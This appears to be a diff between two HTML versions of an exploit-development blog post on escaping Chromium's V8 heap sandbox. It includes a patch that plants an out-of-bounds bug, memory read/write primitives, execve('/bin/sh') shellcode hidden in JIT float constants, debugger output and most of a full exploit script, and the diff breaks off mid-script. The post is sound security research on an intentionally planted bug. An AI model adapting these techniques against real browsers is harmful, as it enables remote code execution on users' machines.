@@ -1,80 +1,58 @@
 <!doctype html><html lang=en>
-<head>
-<title>Code Execution in Chromium's V8 Heap Sandbox :: Anvbis</title>
-<meta charset=utf-8>
+<head><title>Code Execution in Chromium's V8 Heap Sandbox &ndash; anvbis</title>
+<meta name=description content="Exploit development and reverse engineering.">
 <meta name=viewport content="width=device-width,initial-scale=1">
-<meta name=description content="The V8 heap sandbox has been around for quite some time now, and while it initially broke several methods used to gain code execution, new methods have risen to take their place.">
-<meta name=keywords content>
-<meta name=robots content="noodp">
-<link rel=canonical href=https://anvbis.github.io/posts/code-execution-in-chromiums-v8-heap-sandbox/>
-<link rel=stylesheet href=https://anvbis.github.io/assets/style.css>
-<link rel=stylesheet href=https://anvbis.github.io/assets/green.css>
-<link rel=apple-touch-icon href=https://anvbis.github.io/img/apple-touch-icon-192x192.png>
-<link rel="shortcut icon" href=https://anvbis.github.io/img/favicon/green.png>
-<meta name=twitter:card content="summary">
-<meta property="og:locale" content="en">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Code Execution in Chromium's V8 Heap Sandbox">
-<meta property="og:description" content="The V8 heap sandbox has been around for quite some time now, and while it initially broke several methods used to gain code execution, new methods have risen to take their place.">
-<meta property="og:url" content="https://anvbis.github.io/posts/code-execution-in-chromiums-v8-heap-sandbox/">
-<meta property="og:site_name" content="Anvbis">
-<meta property="og:image" content="https://anvbis.github.io/img/favicon/green.png">
-<meta property="og:image:width" content="2048">
-<meta property="og:image:height" content="1024">
-<meta property="article:section" content="Web Browsers">
-<meta property="article:section" content="Javascript Engines">
-<meta property="article:section" content="Chromium">
-<meta property="article:published_time" content="2022-11-27 00:00:00 +0000 UTC">
+<meta charset=utf-8>
+<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==" crossorigin=anonymous>
+<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin=anonymous>
+<link rel=stylesheet href=https://anvbis.github.io/css/palettes/horizon-dark.css>
+<link rel=stylesheet href=https://anvbis.github.io/css/risotto.css>
+<link rel=stylesheet href=https://anvbis.github.io/css/custom.css>
 </head>
-<body class=green>
-<div class="container center headings--one-size">
-<header class=header>
-<div class=header__inner>
-<div class=header__logo>
-<a href=/>
-<div class=logo>
-Anvbis
-</div>
-</a>
-</div>
-<div class=menu-trigger>menu</div>
-</div>
-<nav class=menu>
-<ul class="menu__inner menu__inner--desktop">
-<li><a href=/about>About</a></li>
-<li><a href=/categories>Categories</a></li>
-<li><a href=/posts>Posts</a></li>
-</ul>
-<ul class="menu__inner menu__inner--mobile">
-<li><a href=/about>About</a></li>
-<li><a href=/categories>Categories</a></li>
-<li><a href=/posts>Posts</a></li>
+<body>
+<div class=page>
+<header class=page__header><h1 class=page__logo><a href=https://anvbis.github.io/ class=page__logo-inner>anvbis</a></h1>
+<nav class="page__nav main-nav">
+<ul>
+<li class=main-nav__item><a class=nav-main-item href=https://anvbis.github.io/about title>About</a></li>
 </ul>
 </nav>
 </header>
-<div class=content>
-<div class=post>
-<h1 class=post-title>
-<a href=https://anvbis.github.io/posts/code-execution-in-chromiums-v8-heap-sandbox/>Code Execution in Chromium&rsquo;s V8 Heap Sandbox</a></h1>
-<div class=post-meta>
-<span class=post-date>
-2022-11-27
-</span>
+<section class=page__aside>
+<div class=aside__about>
+<div class=aside__about>
+<h1 class=about__title>Anvbis</h1>
+<p class=about__description>Exploit development and reverse engineering.</p>
 </div>
-<span class=post-tags>
-#<a href=https://anvbis.github.io/tags/browser/>browser</a>&nbsp;
-#<a href=https://anvbis.github.io/tags/v8/>v8</a>&nbsp;
-#<a href=https://anvbis.github.io/tags/chromium/>chromium</a>&nbsp;
-</span>
-<div class=post-content><div>
-<h2 id=1-overview>1. Overview<a href=#1-overview class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<ul class=aside__social-links>
+<li>
+<a href=https://github.com/anvbis rel=me aria-label=GitHub title=GitHub><i class="fa-brands fa-github" aria-hidden=true></i></a>&nbsp;
+</li>
+<li>
+<a href=https://infosec.exchange/@anvbis rel=me aria-label=Mastodon title=Mastodon><i class="fa-brands fa-mastodon" aria-hidden=true></i></a>&nbsp;
+</li>
+</ul>
+</div>
+<hr>
+<div class=aside__content>
+<p>
+2022-11-27
+</p>
+</div>
+</section>
+<section class=page__body>
+<header class=content__header>
+<h1>Code Execution in Chromium&rsquo;s V8 Heap Sandbox</h1>
+</header>
+<div class=content__body>
+<h2 id=overview>Overview</h2>
 <p>The V8 heap sandbox has been around for quite some time now, and while it initially broke several methods used to gain code execution, new methods have risen to take their place.</p>
 <p>I thought it would be worthwile to detail one such method in an article. I&rsquo;ve seen a very limited amount of posts on this particular topic, and what I have seen has been pretty poorly explained. This is mostly for my own reference, but anyone is welcome to learn from it.</p>
-<h2 id=2-introducing-the-heap-sandbox>2. Introducing the Heap Sandbox<a href=#2-introducing-the-heap-sandbox class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<h2 id=introducing-the-heap-sandbox>Introducing the Heap Sandbox</h2>
 <p>First introduced into V8 around a year ago (at the time of this post), the motivation behind the implementation of the heap sandbox was to limit an attacker&rsquo;s ability to write data outside of V8&rsquo;s heap address-space.</p>
 <p>It primarily performs this through the isolation of all external pointers and references to off-heap objects (e.g. the backing store of an ArrayBuffer object). In the heap sandbox, these pointers are converted to references to an external pointer table, essentially indices of a lookup table.</p>
 <p>Memory corruption outside of V8&rsquo;s heap is considered to be an escape from this sandbox. That definition also covers arbitrary code execution.</p>
-<h3 id=21-exploring-the-sandbox>2.1. Exploring the Sandbox<a href=#21-exploring-the-sandbox class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<h3 id=exploring-the-sandbox>Exploring the Sandbox</h3>
 <p>So as previously mentioned, external pointers should be isolated and converted to references to elements of an external pointer table, we can explore what this looks like in practice.</p>
 <p>We can start by allocating two objects, <code>a</code> and <code>b</code>, printing debug information, and digging around the memory a little.</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ArrayBuffer</span>(<span style=color:#ae81ff>1337</span>);
@@ -126,89 +104,80 @@ DebugPrint: 0x19f90010ba95: [JSArrayBuffer]
  - byte_length: 1337
  - max_byte_length: 1337
 ...
-</code></pre><h2 id=3-escaping-the-heap-sandbox>3. Escaping the Heap Sandbox<a href=#3-escaping-the-heap-sandbox class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+</code></pre><h2 id=escaping-the-heap-sandbox>Escaping the Heap Sandbox</h2>
 <p>Now we move on to actually performing a heap sandbox escape. I&rsquo;ve included a patch for a very, very, very simple array out-of-bounds vulnerability below. I&rsquo;ll be using that to demonstrate the technique.</p>
 <p>Note: If you want to follow along, the commit hash for the build of V8 I&rsquo;m using is <code>bd5b3ae5422e9fa1d0f7a281bbdf709e6db65f62</code>.</p>
-<h3 id=31-an-example-vulnerability>3.1. An Example Vulnerability<a href=#31-an-example-vulnerability class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<h3 id=an-example-vulnerability>An Example Vulnerability</h3>
 <p>As mentioned above, the vulnerability introduced here is very simple. A new JSArray builtin is added that allows you to change the length of an array to any arbitrary value, effectively providing you with out-of-bounds access below the array.</p>
-<div class=collapsable-code>
-<input id=1 type=checkbox checked>
-<label for=1>
-<span class=collapsable-code__language>diff</span>
-<span class=collapsable-code__title>patch.diff</span>
-<span class=collapsable-code__toggle data-label-expand=Show data-label-collapse=Hide></span>
-</label>
-<pre class=language-diff><code>
-diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff>diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
 index 49fe48d698..2944eb9edb 100644
---- a/src/builtins/builtins-array.cc
-&#43;&#43;&#43; b/src/builtins/builtins-array.cc
-@@ -395,6 &#43;395,25 @@ BUILTIN(ArrayPush) {
-   return *isolate-&gt;factory()-&gt;NewNumberFromUint((new_length));
+<span style=color:#f92672>--- a/src/builtins/builtins-array.cc
+</span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/src/builtins/builtins-array.cc
+</span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -395,6 +395,25 @@ BUILTIN(ArrayPush) {
+</span><span style=color:#75715e></span>   return *isolate-&gt;factory()-&gt;NewNumberFromUint((new_length));
  }
  
-&#43;BUILTIN(ArrayLen) {
-&#43;  uint32_t len = args.length();
-&#43;  if(len != 2) return ReadOnlyRoots(isolate).undefined_value();
-&#43;
-&#43;  Handle&lt;JSReceiver&gt; receiver;
-&#43;  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
-&#43;      isolate, receiver, Object::ToObject(isolate, args.receiver()));
-&#43;  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);
-&#43;
-&#43;  Handle&lt;Object&gt; argLen;
-&#43;  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
-&#43;      isolate, argLen, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));
-&#43;  uint32_t newLen = static_cast&lt;uint32_t&gt;(argLen-&gt;Number());
-&#43;
-&#43;  auto raw = *array;
-&#43;  raw.set_length(Smi::FromInt(newLen));
-&#43;  return ReadOnlyRoots(isolate).undefined_value();
-&#43;}
-&#43;
- namespace {
+<span style=color:#a6e22e>+BUILTIN(ArrayLen) {
+</span><span style=color:#a6e22e>+  uint32_t len = args.length();
+</span><span style=color:#a6e22e>+  if(len != 2) return ReadOnlyRoots(isolate).undefined_value();
+</span><span style=color:#a6e22e>+
+</span><span style=color:#a6e22e>+  Handle&lt;JSReceiver&gt; receiver;
+</span><span style=color:#a6e22e>+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+</span><span style=color:#a6e22e>+      isolate, receiver, Object::ToObject(isolate, args.receiver()));
+</span><span style=color:#a6e22e>+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);
+</span><span style=color:#a6e22e>+
+</span><span style=color:#a6e22e>+  Handle&lt;Object&gt; argLen;
+</span><span style=color:#a6e22e>+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+</span><span style=color:#a6e22e>+      isolate, argLen, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));
+</span><span style=color:#a6e22e>+  uint32_t newLen = static_cast&lt;uint32_t&gt;(argLen-&gt;Number());
+</span><span style=color:#a6e22e>+
+</span><span style=color:#a6e22e>+  auto raw = *array;
+</span><span style=color:#a6e22e>+  raw.set_length(Smi::FromInt(newLen));
+</span><span style=color:#a6e22e>+  return ReadOnlyRoots(isolate).undefined_value();
+</span><span style=color:#a6e22e>+}
+</span><span style=color:#a6e22e>+
+</span><span style=color:#a6e22e></span> namespace {
  
  V8_WARN_UNUSED_RESULT Object GenericArrayPop(Isolate* isolate,
 diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
 index 859b5cee9a..a16a7d5ca1 100644
---- a/src/builtins/builtins-definitions.h
-&#43;&#43;&#43; b/src/builtins/builtins-definitions.h
-@@ -392,6 &#43;392,7 @@ namespace internal {
-   CPP(ArrayPrototypeGroupToMap)                                                \
+<span style=color:#f92672>--- a/src/builtins/builtins-definitions.h
+</span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/src/builtins/builtins-definitions.h
+</span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -392,6 +392,7 @@ namespace internal {
+</span><span style=color:#75715e></span>   CPP(ArrayPrototypeGroupToMap)                                                \
    /* ES6 #sec-array.prototype.push */                                          \
    CPP(ArrayPush)                                                               \
-&#43;  CPP(ArrayLen)                                                                \
-   TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \
+<span style=color:#a6e22e>+  CPP(ArrayLen)                                                                \
+</span><span style=color:#a6e22e></span>   TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \
    /* ES6 #sec-array.prototype.shift */                                         \
    CPP(ArrayShift)                                                              \
 diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
 index 5888a5cdab..5d13eac799 100644
---- a/src/compiler/typer.cc
-&#43;&#43;&#43; b/src/compiler/typer.cc
-@@ -1880,6 &#43;1880,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
-       return Type::Receiver();
+<span style=color:#f92672>--- a/src/compiler/typer.cc
+</span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/src/compiler/typer.cc
+</span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -1880,6 +1880,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
+</span><span style=color:#75715e></span>       return Type::Receiver();
      case Builtin::kArrayPush:
        return t-&gt;cache_-&gt;kPositiveSafeInteger;
-&#43;    case Builtin::kArrayLen:
-&#43;      return Type::Receiver();
-     case Builtin::kArrayPrototypeReverse:
+<span style=color:#a6e22e>+    case Builtin::kArrayLen:
+</span><span style=color:#a6e22e>+      return Type::Receiver();
+</span><span style=color:#a6e22e></span>     case Builtin::kArrayPrototypeReverse:
      case Builtin::kArrayPrototypeSlice:
        return Type::Receiver();
 diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
 index 7c7b917502..550b25d4ba 100644
---- a/src/init/bootstrapper.cc
-&#43;&#43;&#43; b/src/init/bootstrapper.cc
-@@ -1808,6 &#43;1808,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,
-                           0, false);
+<span style=color:#f92672>--- a/src/init/bootstrapper.cc
+</span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/src/init/bootstrapper.cc
+</span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -1808,6 +1808,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,
+</span><span style=color:#75715e></span>                           0, false);
      SimpleInstallFunction(isolate_, proto, &#34;push&#34;, Builtin::kArrayPrototypePush,
                            1, false);
-&#43;    SimpleInstallFunction(isolate_, proto, &#34;len&#34;, Builtin::kArrayLen,
-&#43;                          2, false);
-     SimpleInstallFunction(isolate_, proto, &#34;reverse&#34;,
+<span style=color:#a6e22e>+    SimpleInstallFunction(isolate_, proto, &#34;len&#34;, Builtin::kArrayLen,
+</span><span style=color:#a6e22e>+                          2, false);
+</span><span style=color:#a6e22e></span>     SimpleInstallFunction(isolate_, proto, &#34;reverse&#34;,
                            Builtin::kArrayPrototypeReverse, 0, false);
      SimpleInstallFunction(isolate_, proto, &#34;shift&#34;,
-</code></pre>
-</div>
+</code></pre></div>
 <p>Here&rsquo;s some Javascript code that triggers this vulnerability. The <code>len</code> builtin is called, and sets the length of the array to the value of <code>1337</code>.</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> [<span style=color:#ae81ff>1.1</span>, <span style=color:#ae81ff>2.2</span>];
 <span style=color:#a6e22e>a</span>.<span style=color:#a6e22e>len</span>(<span style=color:#ae81ff>1337</span>);
@@ -228,7 +197,7 @@ index 7c7b917502..550b25d4ba 100644
            1: 2.2
  }
 ...
-</code></pre><h3 id=32-a-few-exploit-primitives>3.2. A Few Exploit Primitives<a href=#32-a-few-exploit-primitives class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+</code></pre><h3 id=a-few-exploit-primitives>A Few Exploit Primitives</h3>
 <p>I&rsquo;m not going to go into too much detail here, as there are a lot of resources detailing common V8 exploit primitives. Plus if you&rsquo;re reading this I&rsquo;m assuming you already know a little about V8 exploitation.</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>bs</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ArrayBuffer</span>(<span style=color:#ae81ff>8</span>);
 <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>fs</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Float64Array</span>(<span style=color:#a6e22e>bs</span>);
@@ -276,7 +245,7 @@ index 7c7b917502..550b25d4ba 100644
   <span style=color:#a6e22e>oob</span>[<span style=color:#ae81ff>6</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>((<span style=color:#a6e22e>a</span> <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>32</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>+</span> <span style=color:#a6e22e>p</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span><span style=color:#a6e22e>n</span>);
   <span style=color:#a6e22e>flt</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>(<span style=color:#a6e22e>x</span>);
 }
-</code></pre></div><h3 id=33-redirecting-code-execution>3.3. Redirecting Code Execution<a href=#33-redirecting-code-execution class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+</code></pre></div><h3 id=redirecting-code-execution>Redirecting Code Execution</h3>
 <p>Now we can finally move on to the interesting part! How, given that we are in this heap sandbox, can we redirect code execution? Not necessarily to a place we control, but just to any arbitrary location.</p>
 <p>Well, maybe it&rsquo;s possible to corrupt a Function object. We can start by creating a function <code>foo</code> and printing it&rsquo;s debug information in order to dig around in memory.</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>foo</span> <span style=color:#f92672>=</span> () =&gt; {
@@ -335,7 +304,7 @@ pwndbg&gt; job 0x31df001467e5
 pwndbg&gt; c
 ...
  ► 0x55f3898b6c5f &lt;Builtins_CallFunction_ReceiverIsAny+287&gt; jmp rcx &lt;0x6161616161616161&gt;
-</code></pre><h3 id=34-writing-shellcode>3.4. Writing Shellcode<a href=#34-writing-shellcode class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+</code></pre><h3 id=34-writing-shellcode>3.4. Writing Shellcode</h3>
 <p>There&rsquo;s just one more thing we need before we can get arbitrary code execution. We just need to find a way to write some shellcode to executable memory.</p>
 <p>This is an interesting problem, especially since we can no longer write data outside of the heap via an ArrayBuffer object due to the heap sandbox, and since the previously very useful wasm <code>rwx</code> page is outside the sandbox.</p>
 <p>This is actually solved fairly easily, because TurboFan JIT compiles immediate numbers (such as floats) into <code>movabs &lt;reg>, &lt;val></code> instructions - we can use this to place small pockets of shellcode in executable memory.</p>
@@ -467,7 +436,7 @@ log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><spa
 </span><span style=color:#75715e>  1.971182898881177e-246
 </span><span style=color:#75715e>]
 </span><span style=color:#75715e>*/</span>
-</code></pre></div><h3 id=35-executing-shellcode>3.5. Executing Shellcode<a href=#35-executing-shellcode class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+</code></pre></div><h3 id=executing-shellcode>Executing Shellcode</h3>
 <p>Now we have everything we need in order to achieve code execution - both the ability to redirect process execution to an arbitrary address, and the ability to write shellcode to executable memory.</p>
 <p>The below Javascript code can help demonstrate this in its entirety. With the first step being to get TurboFan to compile our function with our &ldquo;shellcode&rdquo;.</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#75715e>/* execve(&#34;/bin/sh&#34;, 0, 0); */</span>
@@ -543,7 +512,7 @@ Continuing.
 [Thread 0x7f07a5164700 (LWP 288624) exited]
 process 288620 is executing new program: /usr/bin/dash
 $ id
-</code></pre><h3 id=36-building-an-exploit>3.6. Building an Exploit<a href=#36-building-an-exploit class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+</code></pre><h3 id=building-an-exploit>Building an Exploit</h3>
 <p>At this point we have the majority of building blocks necessary to build a working exploit. The only missing component necessary to complete it is the part that overwrites the <code>foo</code> function&rsquo;s entry point.</p>
 <p>This is fairly trivial to implement, we find the address of the <code>foo</code> function using our addrof primtive, before reading the pointer to its code object (stored at an offset of 0x18) via our arbitrary read primitive.</p>
 <p>We then use our arbitrary read primitive again, in order to find the pointer to the <code>foo</code> function&rsquo;s entry point (stored at an offset of 0xc). After this, we use our arbitrary write primitive to overwrite the entry point value to the start of our JITed shellcode.</p>
@@ -558,113 +527,98 @@ $ id
 
 <span style=color:#a6e22e>foo</span>();
 </code></pre></div><p>In the code below you can find the whole working exploit code. Note that some of the offsets in the primitives have changed - this was due to the <code>foo</code> function being placed above the arrays on the heap.
-<div class=collapsable-code>
-<input id=2 type=checkbox checked>
-<label for=2>
-<span class=collapsable-code__language>js</span>
-<span class=collapsable-code__title>exploit.js</span>
-<span class=collapsable-code__toggle data-label-expand=Show data-label-collapse=Hide></span>
-</label>
-<pre class=language-js><code>
-var bs = new ArrayBuffer(8);
-var fs = new Float64Array(bs);
-var is = new BigUint64Array(bs);
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>bs</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ArrayBuffer</span>(<span style=color:#ae81ff>8</span>);
+<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>fs</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Float64Array</span>(<span style=color:#a6e22e>bs</span>);
+<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>is</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>BigUint64Array</span>(<span style=color:#a6e22e>bs</span>);
 
-/* converts a float to a 64-bit uint */
-function ftoi(x) {
-  fs[0] = x;
-  return is[0];
+<span style=color:#75715e>/* converts a float to a 64-bit uint */</span>
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>x</span>) {
+  <span style=color:#a6e22e>fs</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>;
+  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>is</span>[<span style=color:#ae81ff>0</span>];
 }
 
-/* converts a 64-bit uint to a float */
-function itof(x) {
-  is[0] = x;
-  return fs[0];
+<span style=color:#75715e>/* converts a 64-bit uint to a float */</span>
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>itof</span>(<span style=color:#a6e22e>x</span>) {
+  <span style=color:#a6e22e>is</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>;
+  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>fs</span>[<span style=color:#ae81ff>0</span>];
 }
 
-/* execve(&#34;/bin/sh&#34;, 0, 0); */
-const foo = () =&gt; {
-  return [
-    1.9711828979523134e-246,
-    1.9562205631094693e-246,
-    1.9557819155246427e-246,
-    1.9711824228871598e-246,
-    1.971182639857203e-246,
-    1.9711829003383248e-246,
-    1.9895153920223886e-246,
-    1.971182898881177e-246
+<span style=color:#75715e>/* execve(&#34;/bin/sh&#34;, 0, 0); */</span>
+<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>foo</span> <span style=color:#f92672>=</span> () =&gt; {
+  <span style=color:#66d9ef>return</span> [
+    <span style=color:#ae81ff>1.9711828979523134</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
+    <span style=color:#ae81ff>1.9562205631094693</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
+    <span style=color:#ae81ff>1.9557819155246427</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
+    <span style=color:#ae81ff>1.9711824228871598</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
+    <span style=color:#ae81ff>1.971182639857203</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
+    <span style=color:#ae81ff>1.9711829003383248</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
+    <span style=color:#ae81ff>1.9895153920223886</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
+    <span style=color:#ae81ff>1.971182898881177</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>
   ];
 }
 
-for (let i = 0; i &lt; 0x40000; i&#43;&#43;)
-  foo();
+<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x40000</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>)
+  <span style=color:#a6e22e>foo</span>();
 
-/* create an oob array */
-let oob = [1.1];
-oob.len(1337);
+<span style=color:#75715e>/* create an oob array */</span>
+<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>oob</span> <span style=color:#f92672>=</span> [<span style=color:#ae81ff>1.1</span>];
+<span style=color:#a6e22e>oob</span>.<span style=color:#a6e22e>len</span>(<span style=color:#ae81ff>1337</span>);
 
-/* flt.elements @ oob[6] */
-let flt = [1.1];
+<span style=color:#75715e>/* flt.elements @ oob[6] */</span>
+<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>flt</span> <span style=color:#f92672>=</span> [<span style=color:#ae81ff>1.1</span>];
 
-/* obj.elements @ oob[15] */
-let tmp = {a: 1};
-let obj = [tmp];
+<span style=color:#75715e>/* obj.elements @ oob[15] */</span>
+<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>tmp</span> <span style=color:#f92672>=</span> {<span style=color:#a6e22e>a</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span>};
+<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>obj</span> <span style=color:#f92672>=</span> [<span style=color:#a6e22e>tmp</span>];
 
-/* addrof primitive */
-function addrof(o) {
-  oob[6] = oob[15]; 
-  obj[0] = o;
-  return (ftoi(flt[0]) &amp; 0xffffffffn) - 1n;
+<span style=color:#75715e>/* addrof primitive */</span>
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>addrof</span>(<span style=color:#a6e22e>o</span>) {
+  <span style=color:#a6e22e>oob</span>[<span style=color:#ae81ff>6</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>oob</span>[<span style=color:#ae81ff>15</span>]; 
+  <span style=color:#a6e22e>obj</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>o</span>;
+  <span style=color:#66d9ef>return</span> (<span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>flt</span>[<span style=color:#ae81ff>0</span>]) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span><span style=color:#a6e22e>n</span>;
 }
 
-/* 64-bit read primitive */
-function read(p) {
-  let a = ftoi(oob[6]) &gt;&gt; 32n;
-  oob[6] = itof((a &lt;&lt; 32n) &#43; p - 8n &#43; 1n);
-  return ftoi(flt[0]);
+<span style=color:#75715e>/* 64-bit read primitive */</span>
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>read</span>(<span style=color:#a6e22e>p</span>) {
+  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>oob</span>[<span style=color:#ae81ff>6</span>]) <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>32</span><span style=color:#a6e22e>n</span>;
+  <span style=color:#a6e22e>oob</span>[<span style=color:#ae81ff>6</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>((<span style=color:#a6e22e>a</span> <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>32</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>+</span> <span style=color:#a6e22e>p</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span><span style=color:#a6e22e>n</span>);
+  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>flt</span>[<span style=color:#ae81ff>0</span>]);
 }
 
-/* 64-bit write primitive */
-function write(p, x) {
-  let a = ftoi(oob[6]) &gt;&gt; 32n;
